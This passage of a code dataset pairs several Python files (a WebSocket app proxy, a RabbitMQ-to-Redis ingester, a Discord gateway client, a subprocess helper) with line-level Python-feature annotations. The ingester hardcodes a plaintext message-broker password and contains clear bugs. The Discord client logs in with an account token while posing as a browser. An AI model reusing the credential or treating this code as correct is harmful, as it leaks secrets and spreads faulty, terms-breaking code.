api_rqst.connect_websocket() as ws:\n            async def downstream() -> None:\n                try:\n                    async for msg in ws:\n                        if msg.type == aiohttp.WSMsgType.ERROR:\n                            await self.write_error(msg)\n                            break\n                        elif msg.type == aiohttp.WSMsgType.CLOSE:\n                            if msg.data != aiohttp.WSCloseCode.OK:\n                                await self.write_error(msg)\n                            break\n                        elif msg.type == aiohttp.WSMsgType.BINARY:\n                            self.writer.write(msg.data)\n                            await self.writer.drain()\n                except ConnectionResetError:\n                    pass  \n                except asyncio.CancelledError:\n                    pass\n                finally:\n                    self.writer.close()\n                    try:\n                        await self.writer.wait_closed()\n                    except (BrokenPipeError, IOError):\n                        pass\n            down_task = asyncio.create_task(downstream())\n            try:\n                while True:\n                    chunk = await self.reader.read(DEFAULT_CHUNK_SIZE)\n                    if not chunk:\n                        break\n                    await ws.send_bytes(chunk)\n            except ConnectionResetError:\n                pass  \n            except asyncio.CancelledError:\n                raise\n            finally:\n                if not down_task.done():\n                    down_task.cancel()\n                    await down_task\n    async def write_error(self, msg: aiohttp.WSMessage) -> None:\n        if isinstance(msg.data, bytes):\n            error_msg = msg.data.decode('utf8')\n        else:\n            error_msg = str(msg.data)\n        rsp = 'HTTP/1.1 503 Service Unavailable\\r\\n' \\\n              'Connection: Closed\\r\\n\\r\\n' \\\n              'WebSocket reply: {}'.format(error_msg)\n        self.writer.write(rsp.encode())\n        await self.writer.drain()\nclass ProxyRunnerContext:\n    __slots__ = (\n        'session_name', 'app_name',\n        'protocol', 'host', 'port',\n        'args', 'envs',\n        'api_session', 'local_server',\n        'exit_code',\n    )\n    session_name: str\n    app_name: str\n    protocol: str\n    host: str\n    port: int\n    args: Dict[str, Union[None, str, List[str]]]\n    envs: Dict[str, str]\n    api_session: Optional[AsyncSession]\n    local_server: Optional[asyncio.AbstractServer]\n    exit_code: int\n    def __init__(\n        self,\n        host: str,\n        port: int,\n        session_name: str,\n        app_name: str,\n        *,\n        protocol: str = 'tcp',\n        args: Sequence[str] = None,\n        envs: Sequence[str] = None,\n    ) -> None:\n        self.host = host\n        self.port = port\n        self.session_name = session_name\n        self.app_name = app_name\n        self.protocol = protocol\n        self.api_session = None\n        self.local_server = None\n        self.exit_code = 0\n        self.args, self.envs = {}, {}\n        if args is not None and len(args) > 0:\n            for argline in args:\n                tokens = []\n                for token in shlex.shlex(argline,\n                                         punctuation_chars=True):\n                    kv = token.split('=', maxsplit=1)\n                    if len(kv) == 1:\n                        tokens.append(shlex.split(token)[0])\n                    else:\n                        tokens.append(kv[0])\n                        tokens.append(shlex.split(kv[1])[0])\n                if len(tokens) == 1:\n                    self.args[tokens[0]] = None\n                elif len(tokens) == 2:\n                    self.args[tokens[0]] = tokens[1]\n                else:\n                    self.args[tokens[0]] = tokens[1:]\n        if envs is not None and len(envs) > 0:\n            for envline in envs:\n                split = envline.strip().split('=', maxsplit=2)\n                if len(split) == 2:\n                    self.envs[split[0]] = split[1]\n                else:\n                    self.envs[split[0]] = ''\n    async def handle_connection(\n        self,\n        reader: asyncio.StreamReader,\n        writer: asyncio.StreamWriter,\n    ) -> None:\n        assert self.api_session is not None\n        p = WSProxy(\n            self.api_session,\n            self.session_name,\n            self.app_name,\n            self.args,\n            self.envs,\n            reader,\n            writer,\n        )\n        try:\n            await p.run()\n        except asyncio.CancelledError:\n            pass\n        except Exception as e:\n            print_error(e)\n    async def __aenter__(self) -> None:\n        self.exit_code = 0\n        self.api_session = AsyncSession()\n        await self.api_session.__aenter__()\n        user_url_template = \"{protocol}://{host}:{port}\"\n        try:\n            compute_session = self.api_session.ComputeSession(self.session_name)\n            all_apps = await compute_session.stream_app_info()\n            for app_info in all_apps:\n                if app_info['name'] == self.app_name:\n                    if 'url_template' in app_info.keys():\n                        user_url_template = app_info['url_template']\n                    break\n            else:\n                print_fail(f'The app \"{self.app_name}\" is not supported by the session.')\n                self.exit_code = 1\n                return\n            self.local_server = await asyncio.start_server(\n                self.handle_connection, self.host, self.port)\n            user_url = user_url_template.format(\n                protocol=self.protocol,\n                host=self.host,\n                port=self.port,\n            )\n            print_info(\n                \"A local proxy to the application \\\"{0}\\\" \".format(self.app_name) +\n                \"provided by the session \\\"{0}\\\" \".format(self.session_name) +\n                \"is available at:\\n{0}\".format(user_url)\n            )\n            if self.host == '0.0.0.0':\n                print_warn('NOTE: Replace \"0.0.0.0\" with the actual hostname you use '\n                        'to connect with the CLI app proxy.')\n        except Exception:\n            await self.api_session.__aexit__(*sys.exc_info())\n            raise\n    async def __aexit__(self, *exc_info) -> None:\n        if self.local_server is not None:\n            print_info(\"Shutting down....\")\n            self.local_server.close()\n            await self.local_server.wait_closed()\n        assert self.api_session is not None\n        await self.api_session.__aexit__(*exc_info)\n        assert self.api_session.closed\n        if self.local_server is not None:\n            print_info(\"The local proxy to \\\"{}\\\" has terminated.\"\n                       .format(self.app_name))\n        self.local_server = None\n@main.command()\n@click.argument('session_name', type=str, metavar='NAME')\n@click.argument('app', type=str)\n@click.option('-b', '--bind', type=str, default='127.0.0.1:8080', metavar='[HOST:]PORT',\n              help='The IP/host address and the port number to bind this proxy.')\n@click.option('--arg', type=str, multiple=True, metavar='\"--option <value>\"',\n              help='Add additional argument when starting service.')\n@click.option('-e', '--env', type=str, multiple=True, metavar='\"ENVNAME=envvalue\"',\n              help='Add additional environment variable when starting service.')\ndef app(session_name, app, bind, arg, env):\n    bind_parts = bind.rsplit(':', maxsplit=1)\n    if len(bind_parts) == 1:\n        host = '127.0.0.1'\n        port = int(bind_parts[0])\n    elif len(bind_parts) == 2:\n        host = bind_parts[0]\n        port = int(bind_parts[1])\n    try:\n        proxy_ctx = ProxyRunnerContext(\n            host, port,\n            session_name, app,\n            protocol='tcp',\n            args=arg,\n            envs=env,\n        )\n        asyncio_run_forever(proxy_ctx)\n        sys.exit(proxy_ctx.exit_code)\n    except Exception as e:\n        print_error(e)\n        sys.exit(1)\n@main.command()\n@click.argument('session_name', type=str, metavar='NAME', nargs=1)\n@click.argument('app_name', type=str, metavar='APP', nargs=-1)\n@click.option('-l', '--list-names', is_flag=True,\n              help='Just print all available services.')\ndef apps(session_name, app_name, list_names):\n    async def print_arguments():\n        apps = []\n        async with AsyncSession() as api_session:\n            compute_session = api_session.ComputeSession(session_name)\n            apps = await compute_session.stream_app_info()\n            if len(app_name) > 0:\n                apps = list(filter(lambda x: x['name'] in app_name))\n        if list_names:\n            print_info('This session provides the following app services: {0}'\n                        .format(', '.join(list(map(lambda x: x['name'], apps)))))\n            return\n        for service in apps:\n            has_arguments = 'allowed_arguments' in service.keys()\n            has_envs = 'allowed_envs' in service.keys()\n            if has_arguments or has_envs:\n                print_info('Information for service {0}:'.format(service['name']))\n                if has_arguments:\n                    print('\\tAvailable arguments: {0}'.format(service['allowed_arguments']))\n                if has_envs:\n                    print('\\tAvailable environment variables: {0}'.format(service['allowed_envs']))\n            else:\n                print_info('Service {0} does not have customizable arguments.'.format(service['name']))\n    try:\n        asyncio_run(print_arguments())\n    except Exception as e:\n        print_error(e)",
            "patterns": {
                "pep_526": [
                    [
                        112,
                        "session_name: str"
                    ],
                    [
                        113,
                        "app_name: str"
                    ],
                    [
                        114,
                        "protocol: str"
                    ],
                    [
                        115,
                        "host: str"
                    ],
                    [
                        116,
                        "port: int"
                    ],
                    [
                        117,
                        "args: Dict[str, Union[None, str, List[str]]]"
                    ],
                    [
                        118,
                        "envs: Dict[str, str]"
                    ],
                    [
                        119,
                        "api_session: Optional[AsyncSession]"
                    ],
                    [
                        120,
                        "local_server: Optional[asyncio.AbstractServer]"
                    ],
                    [
                        121,
                        "exit_code: int"
                    ]
                ],
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_585": [
                    [
                        5,
                        "from typing import (",
                        "suggestion"
                    ],
                    [
                        5,
                        "from typing import (",
                        "suggestion"
                    ]
                ],
                "pep_585v": [
                    [
                        117,
                        "    args: Dict[str, Union[None, str, List[str]]]",
                        "violation"
                    ],
                    [
                        118,
                        "    envs: Dict[str, str]",
                        "violation"
                    ]
                ],
                "pep_525": [
                    [
                        58,
                        68,
                        "async for",
                        "async for msg in ws:\n                        if msg.type == aiohttp.WSMsgType.ERROR:\n                            await self.write_error(msg)\n                            break\n                        elif msg.type == aiohttp.WSMsgType.CLOSE:\n                            if msg.data != aiohttp.WSCloseCode.OK:\n                                await self.write_error(msg)\n                            break\n                        elif msg.type == aiohttp.WSMsgType.BINARY:\n                            self.writer.write(msg.data)\n                            await self.writer.drain()"
                    ]
                ],
                "pep_498v": [
                    [
                        99,
                        101,
                        ".format()"
                    ],
                    [
                        231,
                        232,
                        ".format()"
                    ],
                    [
                        278,
                        279,
                        ".format()"
                    ],
                    [
                        214,
                        214,
                        ".format()"
                    ],
                    [
                        285,
                        285,
                        ".format()"
                    ],
                    [
                        291,
                        291,
                        ".format()"
                    ],
                    [
                        212,
                        212,
                        ".format()"
                    ],
                    [
                        213,
                        213,
                        ".format()"
                    ],
                    [
                        287,
                        287,
                        ".format()"
                    ],
                    [
                        289,
                        289,
                        ".format()"
                    ]
                ],
                "pep_498": [
                    [
                        45,
                        "        path = f\"/stream/{prefix}/{self.session_name}/tcpproxy\""
                    ],
                    [
                        201,
                        "                print_fail(f'The app \"{self.app_name}\" is not supported by the session.')"
                    ]
                ]
            }
        },
        "9": {
            "file": "import asyncio\nimport json\nimport aio_pika\nimport hashlib\nimport concurrent.futures\nfrom rejson import Client, Path\nrg_dict = {}\ndef key_generator(data):\n    print('> Inside key_generator******')\n    print('> data(key_generator)---- ' + data.decode())\n    data_dict = json.loads(data.decode())\n    data_redis_q = {}\n    default = '_d'\n    res_id = data_dict['id']\n    rg = res_id.split('/')[3]\n    sha_id = hashlib.sha1(res_id.encode())\n    print(\"> RG from data---- \" + rg)\n    print(\"> rg_dict---- \" + str(rg_dict))\n    print(\"> SHA1[res_id]---- \" + sha_id.hexdigest())\n    if rg in rg_dict.keys():\n        print('> RG is present.')\n        attribute = rg_dict[rg]\n        path_param = \".\" + sha_id.hexdigest() + '_' + data_dict[attribute]\n    else:\n        print('> RG is not present.')\n        path_param = \".\" + sha_id.hexdigest() + default\n    data_redis_q['key'] = rg;\n    data_redis_q['path_param'] = path_param\n    data_redis_q['data'] = data_dict\n    print('> data_redis_q---- ' + json.dumps(data_redis_q))\n    return json.dumps(data_redis_q).encode()\ndef insert_into_redis(client, data):\n    data_dict = json.dumps(data.decode())\n    print('> redis_key: ' + data_dict['key'] + ' redis_path_param: ' + data_dict['path_param'])\n    some_test_data_id = data_dict['data']['id']\n    client.jsonset(data_dict['key'], Path.rootPath(), json.dumps({}))\n    client.jsonset(data_dict['key'], data_dict['path_param'], data_dict['data'])\n    if (json.loads(client.jsonget(data_dict['key'], data_dict['path_param']))['id']\n            == some_test_data_id):\n        return 'success'\n    else:\n        return 'failed'\nasync def main_loop(loop):\n    with open('attribute_list.json') as rg_json_f:\n        rg_dict = json.load(rg_json_f)\n    print('> RG is loaded: ' + str(rg_dict))\n    try:\n        redis_client = Client(host='redis-server', port=6379, decode_responses=True)\n        rmq_pub_client = await aio_pika.connect_robust(host='tasks.rabbitmq',port=5672,login='redis-user',\n                                                       password='uv)aqcY]qSvARi74', virtualhost='IUDX',loop=loop\n        )\n    except ConnectionError as e:\n        print('> Connection Failed!')\n    rmq_q_name = \"redis-latest\"\n    redis_q_name = \"redis-ingestion-queue\"\n    routing_key = \"latest-data-for-redis\"\n    rmq_latest_exchange = \"redis-latest-ex\"\n    async with rmq_pub_client:\n        channel = await rmq_pub_client.channel()\n        queue_rmq = await channel.declare_queue(rmq_q_name, durable=True)\n        queue_redis = await channel.declare_queue(redis_q_name, durable=True)\n        latest_exchange = await channel.declare_exchange(rmq_latest_exchange, \"direct\", durable=True)\n        await queue_redis.bind(latest_exchange, routing_key)\n        async with queue_rmq.iterator() as queue_iter_1:\n            async for message1 in queue_iter_1:\n                async with message1.process():\n                    with concurrent.futures.ProcessPoolExecutor() as pool:\n                        result = await loop.run_in_executor(pool, key_generator(message1.body))\n                        print(\"> result from SHA1_generator---- \" + result)\n                        latest_exchange.publish(latest_exchange, result, routing_key=routing_key, mandatory=True)\n        async with queue_redis.iterator() as queue_iter_2:\n            async for message2 in queue_iter_2:\n                async with message2.process():\n                    with concurrent.futures.ThreadPoolExecutor() as pool:\n                        result = await loop.run_in_executor(pool, insert_into_redis(redis_client, message2.body))\n                        if result is not None and result == 'success':\n                            print('Insertion was successful.')\n                        else:\n                            print('Insertion failed!')\nif __name__ == '__main__':\n    print('> Running v0.0.1 Redis Client.')\n    loop = asyncio.get_event_loop()\n    loop.create_task(main_loop(loop))\n    loop.run_forever()",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        65,
                        70,
                        "async for",
                        "async for message1 in queue_iter_1:\n                async with message1.process():\n                    with concurrent.futures.ProcessPoolExecutor() as pool:\n                        result = await loop.run_in_executor(pool, key_generator(message1.body))\n                        print(\"> result from SHA1_generator---- \" + result)\n                        latest_exchange.publish(latest_exchange, result, routing_key=routing_key, mandatory=True)"
                    ],
                    [
                        72,
                        79,
                        "async for",
                        "async for message2 in queue_iter_2:\n                async with message2.process():\n                    with concurrent.futures.ThreadPoolExecutor() as pool:\n                        result = await loop.run_in_executor(pool, insert_into_redis(redis_client, message2.body))\n                        if result is not None and result == 'success':\n                            print('Insertion was successful.')\n                        else:\n                            print('Insertion failed!')"
                    ]
                ]
            }
        },
        "10": {
            "file": "import asyncio\nimport websockets\nimport json\nfrom collections import Counter\nclass TaskCompleted(Exception):\n    pass\nclass GatewayServer():\n    class OPCODE: \n        DISPATCH =              0  \n        HEARTBEAT =             1  \n        IDENTIFY =              2  \n        STATUS_UPDATE =         3  \n        VOICE_UPDATE =          4  \n        RESUME =                6  \n        RECONNECT =             7  \n        REQUEST_GUILD_MEMBERS = 8  \n        INVALID_SESSION =       9  \n        HELLO =                 10 \n        HEARTBEAT_ACK =         11 \n        GUILD_SYNC =            12 \n    def __init__(self, token, proxy_host, proxy_port):\n        self.proxy_host = proxy_host\n        self.proxy_port = proxy_port\n        self.interval = None\n        self.sequence = None\n        self.session_id = None\n        self.session_data = None\n        self.all_tasks = {} \n        self.receiveData = [] \n        self.receiveChecklist = [] \n        self.mailSent = False \n        self.allTasksChecklist = {} \n        self.taskCompleted = False \n        self.allTasksCompleted = False \n        self.auth = {\n                \"token\": token,\n                \"properties\": {\n                    \"os\": \"Windows\",\n                    \"browser\": \"Chrome\",\n                    \"device\": \"\",\n                },\n                \"large_threshold\": 150,\n                \"synced_guilds\": [],\n                \"presence\": {\n                    \"status\": \"online\",\n                    \"since\": 0,\n                    \"afk\": False,\n                    \"game\": None\n                },\n                \"compress\": False\n            }\n        self.loop = asyncio.get_event_loop()\n        self.channelID = None\n        self.userID = None\n        self.media_token = None\n        self.call_endpoint = None\n        self.call_session_id = None\n    def key_checker(self, element, keys):\n        _element = element\n        for key in keys:\n            try:\n                _element = _element[key]\n            except (KeyError, TypeError) as e:\n                return False\n        return True\n    def value_checker(self, element, keys, valuetest):\n        _element = element\n        for index,key in enumerate(keys):\n            try:\n                _element = _element[key]\n                if index==len(keys)-1 and _element != valuetest:\n                   return False\n            except (KeyError, TypeError) as e:\n                return False\n        return True\n    def NestedDictValues(self,d): \n        for v in d.values():\n            if isinstance(v, dict):\n                yield from self.NestedDictValues(v)\n            else:\n                yield v\n    def runIt(self,tasks):\n        self.all_tasks = tasks\n        if self.all_tasks != 'get session data':\n            self.allTasksChecklist = {key: None for key in self.all_tasks.keys()} \n        else:\n        \tself.allTasksChecklist = {1:'get session data'}\n        try:\n            asyncio.run(self.main())\n        except TaskCompleted:\n            self.loop.stop()\n    async def taskManager(self):\n        if self.all_tasks != 'get session data':\n            self.taskCompleted = True \n            for index in self.all_tasks:\n                print('task num: '+str(index))\n                await self.addTask(self.all_tasks[index])\n                while self.taskCompleted == False:\n                    await asyncio.sleep(1)\n                self.taskCompleted = False \n                self.allTasksChecklist[index] = \"complete\"\n                print(self.allTasksChecklist)\n        else:\n            while self.session_data is None:\n                await asyncio.sleep(1)\n            self.allTasksChecklist[1] = \"complete\" \n    async def main(self): \n        if self.proxy_host == None:\n            async with websockets.connect(\n                    'wss://gateway.discord.gg/?v=6&encoding=json', origin=\"https://discordapp.com\") \\\n                    as self.websocket:\n                await self.hello()\n                if self.interval is None:\n                    print(\"Hello failed, exiting\")\n                    return\n                await asyncio.gather(self.heartbeat(), self.receive(),self.stopLoop(),self.taskManager())\n        else:\n            async with websockets.connect(\n                    'wss://gateway.discord.gg/?v=6&encoding=json', origin=\"https://discordapp.com\", host=self.proxy_host, port=self.proxy_port) \\\n                    as self.websocket:\n                await self.hello()\n                if self.interval is None:\n                    print(\"Hello failed, exiting\")\n                    return\n                await asyncio.gather(self.heartbeat(), self.receive(),self.stopLoop(),self.taskManager())\n    async def receive(self):\n        print(\"Entering receive\")\n        async for message in self.websocket:\n            print(\"<\", message)\n            data = json.loads(message)\n            if data[\"op\"] == self.OPCODE.DISPATCH:\n                self.sequence = int(data[\"s\"])\n                event_type = data[\"t\"]\n                if event_type == \"READY\":\n                    self.session_id = data[\"d\"][\"session_id\"]\n                    self.session_data = data\n                if event_type == \"VOICE_SERVER_UPDATE\":\n                    if \"token\" in data[\"d\"]:\n                        self.media_token = data[\"d\"][\"token\"]\n                    if \"endpoint\" in data[\"d\"]:\n                        endpointdata = data[\"d\"][\"endpoint\"].split(':')[:][0]\n                        self.call_endpoint = \"wss://{}/?v=5\".format(endpointdata)\n                if event_type == \"VOICE_STATE_UPDATE\":\n                    if \"user_id\" in data[\"d\"]:\n                        self.userID = data[\"d\"][\"user_id\"]\n                    if \"session_id\" in data[\"d\"]:\n                        self.call_session_id = data[\"d\"][\"session_id\"]\n            for checklistIndex in range(len(self.receiveChecklist)): \n                if self.receiveChecklist[checklistIndex] != [\"complete\"]:\n                    if \"op\" in self.receiveChecklist[checklistIndex] and data[\"op\"] == self.receiveData[checklistIndex][\"op\"]:\n                        self.receiveChecklist[checklistIndex][\"op\"] = [\"complete\"]\n                    if \"d\" in self.receiveChecklist[checklistIndex]:\n                        if \"keys\" in self.receiveChecklist[checklistIndex][\"d\"] and set(self.receiveData[checklistIndex][\"d\"][\"keys\"]).issubset(list(data[\"d\"].keys())): \n                            self.receiveChecklist[checklistIndex][\"d\"][\"keys\"] = [\"complete\"]\n                        if \"values\" in self.receiveChecklist[checklistIndex][\"d\"] and not Counter(self.receiveData[checklistIndex][\"d\"][\"values\"]) - Counter(list(data[\"d\"].values())): \n                            self.receiveChecklist[checklistIndex][\"d\"][\"values\"] = [\"complete\"]\n                        if \"texts\" in self.receiveChecklist[checklistIndex][\"d\"] and all(x in str(data[\"d\"]) for x in self.receiveData[checklistIndex][\"d\"][\"texts\"]): \n                            self.receiveChecklist[checklistIndex][\"d\"][\"texts\"] = [\"complete\"]\n                    if \"s\" in self.receiveChecklist[checklistIndex] and data[\"s\"] == self.receiveData[checklistIndex][\"s\"]:\n                        self.receiveChecklist[checklistIndex][\"s\"] = [\"complete\"]\n                    if \"t\" in self.receiveChecklist[checklistIndex] and data[\"t\"] == self.receiveData[checklistIndex][\"t\"]:\n                        self.receiveChecklist[checklistIndex][\"t\"] = [\"complete\"]\n                    if \"keychecker\" in self.receiveChecklist[checklistIndex] and self.key_checker(data,self.receiveData[checklistIndex][\"keychecker\"]):\n                        self.receiveChecklist[checklistIndex][\"keychecker\"] = [\"complete\"]\n                    if \"keyvaluechecker\" in self.receiveChecklist[checklistIndex] and self.value_checker(data,self.receiveData[checklistIndex][\"keyvaluechecker\"][0],self.receiveData[checklistIndex][\"keyvaluechecker\"][1]):\n                        self.receiveChecklist[checklistIndex][\"keyvaluechecker\"] = [\"complete\"]\n                    if all(value == [\"complete\"] for value in list(self.NestedDictValues(self.receiveChecklist[checklistIndex]))): \n                        self.receiveChecklist[checklistIndex] = [\"complete\"] \n                        break \n            if len(self.receiveChecklist)>0 and all(item == [\"complete\"] for item in self.receiveChecklist) and self.mailSent:\n                self.taskCompleted = True \n    async def send(self, opcode, payload):\n        data = self.opcode(opcode, payload)\n        print(\">\", data)\n        await self.websocket.send(data)\n    async def heartbeat(self):\n        print(\"Entering heartbeat\")\n        while self.interval is not None:\n            print(\"Sending a heartbeat\")\n            await self.send(self.OPCODE.HEARTBEAT, self.sequence)\n            await asyncio.sleep(self.interval)\n    async def hello(self):\n        await self.send(self.OPCODE.IDENTIFY, self.auth)\n        print(f\"hello > auth\")\n        ret = await self.websocket.recv()\n        print(f\"hello < {ret}\")\n        data = json.loads(ret)\n        opcode = data[\"op\"]\n        if opcode != 10:\n            print(\"Unexpected reply\")\n            print(ret)\n            return\n        self.interval = (data[\"d\"][\"heartbeat_interval\"] - 2000) / 1000\n        print(\"interval:\", self.interval)\n    def opcode(self, opcode: int, payload) -> str:\n        data = {\n            \"op\": opcode,\n            \"d\": payload\n        }\n        return json.dumps(data)\n    async def addTask(self,data):\n        self.mailSent = False \n        self.taskCompleted = False \n        self.receiveChecklist = [] \n        self.receiveData = data[\"receive\"]\n        for searchIndex in range(len(self.receiveData)):\n            self.receiveChecklist.append({})\n            if \"op\" in self.receiveData[searchIndex]:\n                self.receiveChecklist[searchIndex][\"op\"] = [None]\n            if \"d\" in self.receiveData[searchIndex]:\n                self.receiveChecklist[searchIndex][\"d\"] = {}\n                if \"keys\" in self.receiveData[searchIndex][\"d\"]:\n                    self.receiveChecklist[searchIndex][\"d\"][\"keys\"] = [None]\n                if \"values\" in self.receiveData[searchIndex][\"d\"]:\n                    self.receiveChecklist[searchIndex][\"d\"][\"values\"] = [None]\n                if \"texts\" in self.receiveData[searchIndex][\"d\"]:\n                    self.receiveChecklist[searchIndex][\"d\"][\"texts\"] = [None]\n            if \"s\" in self.receiveData[searchIndex]:\n                self.receiveChecklist[searchIndex][\"s\"] = [None]\n            if \"t\" in self.receiveData[searchIndex]:\n                self.receiveChecklist[searchIndex][\"t\"] = [None]\n            if \"keychecker\" in self.receiveData[searchIndex]:\n                self.receiveChecklist[searchIndex][\"keychecker\"] = [None]\n            if \"keyvaluechecker\" in self.receiveData[searchIndex]:\n                self.receiveChecklist[searchIndex][\"keyvaluechecker\"] = [None]\n        sendData = data[\"send\"] \n        for mail in sendData: \n            await self.send(mail[\"op\"],mail[\"d\"])\n        self.mailSent = True\n    async def stopLoop(self):\n        while not all(value == \"complete\" for value in self.allTasksChecklist.values()):\n            await asyncio.sleep(1)\n        self.allTasksCompleted = True\n        raise TaskCompleted(self.all_tasks)",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        128,
                        171,
                        "async for",
                        "async for message in self.websocket:\n            print(\"<\", message)\n            data = json.loads(message)\n            if data[\"op\"] == self.OPCODE.DISPATCH:\n                self.sequence = int(data[\"s\"])\n                event_type = data[\"t\"]\n                if event_type == \"READY\":\n                    self.session_id = data[\"d\"][\"session_id\"]\n                    self.session_data = data\n                if event_type == \"VOICE_SERVER_UPDATE\":\n                    if \"token\" in data[\"d\"]:\n                        self.media_token = data[\"d\"][\"token\"]\n                    if \"endpoint\" in data[\"d\"]:\n                        endpointdata = data[\"d\"][\"endpoint\"].split(':')[:][0]\n                        self.call_endpoint = \"wss://{}/?v=5\".format(endpointdata)\n                if event_type == \"VOICE_STATE_UPDATE\":\n                    if \"user_id\" in data[\"d\"]:\n                        self.userID = data[\"d\"][\"user_id\"]\n                    if \"session_id\" in data[\"d\"]:\n                        self.call_session_id = data[\"d\"][\"session_id\"]\n            for checklistIndex in range(len(self.receiveChecklist)): \n                if self.receiveChecklist[checklistIndex] != [\"complete\"]:\n                    if \"op\" in self.receiveChecklist[checklistIndex] and data[\"op\"] == self.receiveData[checklistIndex][\"op\"]:\n                        self.receiveChecklist[checklistIndex][\"op\"] = [\"complete\"]\n                    if \"d\" in self.receiveChecklist[checklistIndex]:\n                        if \"keys\" in self.receiveChecklist[checklistIndex][\"d\"] and set(self.receiveData[checklistIndex][\"d\"][\"keys\"]).issubset(list(data[\"d\"].keys())): \n                            self.receiveChecklist[checklistIndex][\"d\"][\"keys\"] = [\"complete\"]\n                        if \"values\" in self.receiveChecklist[checklistIndex][\"d\"] and not Counter(self.receiveData[checklistIndex][\"d\"][\"values\"]) - Counter(list(data[\"d\"].values())): \n                            self.receiveChecklist[checklistIndex][\"d\"][\"values\"] = [\"complete\"]\n                        if \"texts\" in self.receiveChecklist[checklistIndex][\"d\"] and all(x in str(data[\"d\"]) for x in self.receiveData[checklistIndex][\"d\"][\"texts\"]): \n                            self.receiveChecklist[checklistIndex][\"d\"][\"texts\"] = [\"complete\"]\n                    if \"s\" in self.receiveChecklist[checklistIndex] and data[\"s\"] == self.receiveData[checklistIndex][\"s\"]:\n                        self.receiveChecklist[checklistIndex][\"s\"] = [\"complete\"]\n                    if \"t\" in self.receiveChecklist[checklistIndex] and data[\"t\"] == self.receiveData[checklistIndex][\"t\"]:\n                        self.receiveChecklist[checklistIndex][\"t\"] = [\"complete\"]\n                    if \"keychecker\" in self.receiveChecklist[checklistIndex] and self.key_checker(data,self.receiveData[checklistIndex][\"keychecker\"]):\n                        self.receiveChecklist[checklistIndex][\"keychecker\"] = [\"complete\"]\n                    if \"keyvaluechecker\" in self.receiveChecklist[checklistIndex] and self.value_checker(data,self.receiveData[checklistIndex][\"keyvaluechecker\"][0],self.receiveData[checklistIndex][\"keyvaluechecker\"][1]):\n                        self.receiveChecklist[checklistIndex][\"keyvaluechecker\"] = [\"complete\"]\n                    if all(value == [\"complete\"] for value in list(self.NestedDictValues(self.receiveChecklist[checklistIndex]))): \n                        self.receiveChecklist[checklistIndex] = [\"complete\"] \n                        break \n            if len(self.receiveChecklist)>0 and all(item == [\"complete\"] for item in self.receiveChecklist) and self.mailSent:\n                self.taskCompleted = True"
                    ]
                ],
                "pep_498v": [
                    [
                        142,
                        142,
                        ".format()"
                    ]
                ],
                "pep_498": [
                    [
                        184,
                        "        print(f\"hello > auth\")"
                    ],
                    [
                        186,
                        "        print(f\"hello < {ret}\")"
                    ]
                ]
            }
        },
        "11": {
            "file": "import datetime\nimport string\nimport random\nfrom asyncio import create_subprocess_exec\nfrom asyncio.subprocess import PIPE as ASYNC_PIPE, STDOUT as ASYNC_STDOUT\nfrom logging import Logger, LoggerAdapter\nfrom subprocess import Popen, PIPE, STDOUT\nfrom typing import Union\ndef generate_test_run_id() -> str:\n  now = datetime.datetime.now()\n  date = now.date()\n  time = now.time()\n  name = ''.join(random.choices(string.ascii_letters, k=4))\n  return f'{date}_{time}_{name}'\ndef execute(program: str, *args: str, logger: Union[Logger, LoggerAdapter]) -> None:\n  command = \" \".join([program, *args])\n  logger.info(f'Executing subprocess: \"{command}\" ...')\n  popen = Popen([program, *args], stdout=PIPE, stderr=STDOUT)\n  for line in popen.stdout:\n    logger.info(f'[{program}] {line.decode(\"utf-8\").strip()}')\n  popen.communicate()\n  if popen.returncode == 0:\n    logger.info(f'\"{command}\" succeeded')\n  else:\n    message = f'\"{command}\" failed with return code {popen.returncode}'\n    logger.error(message)\n    raise RuntimeError(message)\nasync def execute_async(program: str, *args: str, logger: Union[Logger, LoggerAdapter]) -> None:\n  command = \" \".join([program, *args])\n  logger.info(f'Executing subprocess: \"{command}\" ...')\n  process = await create_subprocess_exec(program, *args, stdout=ASYNC_PIPE, stderr=ASYNC_STDOUT)\n  async for line in process.stdout:\n    logger.info(f'[{program}] {line.decode(\"utf-8\").strip()}')\n  await process.communicate()\n  if process.returncode == 0:\n    logger.info(f'\"{command}\" succeeded')\n  else:\n    message = f'\"{command}\" failed with return code {process.returncode}'\n    logger.error(message)\n    raise RuntimeError(message)",
            "patterns": {
                "pep_567": [
                    [
                        4,
                        4,
                        "import",
                        "from asyncio import create_subprocess_exec"
                    ]
                ],
                "pep_525": [
                    [
                        32,
                        33,
                        "async for",
                        "async for line in process.stdout:\n    logger.info(f'[{program}] {line.decode(\"utf-8\").strip()}')"
                    ]
                ],
                "pep_498": [
                    [
                        14,
                        "  return f'{date}_{time}_{name}'"
                    ],
                    [
                        17,
                        "  logger.info(f'Executing subprocess: \"{command}\" ...')"
                    ],
                    [
                        25,
                        "    message = f'\"{command}\" failed with return code {popen.returncode}'"
                    ],
                    [
                        30,
                        "  logger.info(f'Executing subprocess: \"{command}\" ...')"
                    ],
                    [
                        38,
                        "    message = f'\"{command}\" failed with return code {process.returncode}'"
                    ],
                    [
                        20,
                        "    logger.info(f'[{program}] {line.decode(\"utf-8\").strip()}')"
                    ],
                    [
                        23,
                        "    logger.info(f'\"{command}\" succeeded')"
                    ],
                    [
                        33,
                        "    logger.info(f'[{program}] {line.decode(\"utf-8\").strip()}')"
                    ],
                    [
                        36,
                        "    logger.info(f'\"{command}\" succeeded')"
                    ]
                ]
            }
        },
        "12": {
